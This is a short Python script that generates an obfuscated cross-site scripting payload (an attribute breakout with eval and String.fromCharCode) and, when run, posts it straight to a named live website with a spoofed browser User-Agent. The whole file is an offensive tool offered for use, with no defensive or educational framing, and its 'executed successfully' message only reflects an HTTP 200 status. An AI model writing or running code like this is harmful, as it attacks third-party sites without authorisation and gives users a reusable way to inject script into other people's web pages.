import requests

class XSSPayloadGenerator:
    def __init__(self):
        self.payload = ""
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
        }

    def generate_payload(self, message):
        self.payload = '\"><script>eval(String.fromCharCode(' + ','.join(str(ord(char)) for char in message) + ')</script>'
        return self.payload

    def execute_payload(self):
        url = "https://pointlessai.com"
        data = {"input": self.payload}

        try:
            response = requests.post(url, data=data, headers=self.headers)
            response.raise_for_status()

            if response.status_code == 200:
                print("Payload executed successfully")
            else:
                print("Payload execution failed")
        except requests.exceptions.RequestException as e:
            print(f"Error executing payload: {e}")

    def set_custom_header(self, key, value):
        self.headers[key] = value

    def main(self):
        xss_payload = self.generate_payload("alert('XSS Attack')")

        # Set custom headers
        self.set_custom_header("X-Custom-Header", "Custom Value")

        self.execute_payload()
        print("XSS Payload:", xss_payload)

# Example of how to use the class
generator = XSSPayloadGenerator()
generator.main()
